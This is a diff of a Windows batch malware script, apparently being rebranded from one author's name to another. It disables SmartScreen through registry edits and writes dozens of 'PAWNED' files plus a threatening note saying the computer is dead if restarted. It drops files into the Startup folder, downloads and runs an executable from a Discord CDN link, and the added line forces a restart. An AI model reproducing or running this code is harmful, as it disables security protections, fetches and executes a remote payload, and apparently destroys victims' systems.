@@ -33,15 +33,15 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScree
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "SmartScreenEnabled" /t "REG_SZ" /d "Off" /f
 set loop1=0
 :loop1
-echo PAWNED BY JAM :) > PAWNED[%random%].txt
+echo PAWNED BY ARAKELIAN :) > ARAKED[%random%].txt
 set /a loop1=%loop1%+1 
 if "%loop1%"=="60" goto 2
 goto loop1
 
 :2
 cd %temp%
-echo YOUR COMPUTER IS PAWNED BY JAM... IF YOU RESTART YOUR COMPUTER IS DEAD :) > NOTE_pawned.txt
-start NOTE_pawned.txt
+echo YOUR COMPUTER IS PAWNED BY ARAKELIAN... IF YOU RESTART YOUR COMPUTER IS DEAD :) > NOTE_araked.txt
+start NOTE_araked.txt
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 echo pranked > hehehe[%random%].txt
 cd %temp%
@@ -76,6 +76,7 @@ cd %temp%
 curl https://cdn.discordapp.com/attachments/951496409318817872/967574561547776000/Zer0Mem0ryMelting.exe -O
 start Zer0Mem0ryMelting.exe
 timeout 60
+shutdown /r
 goto exit
 
 
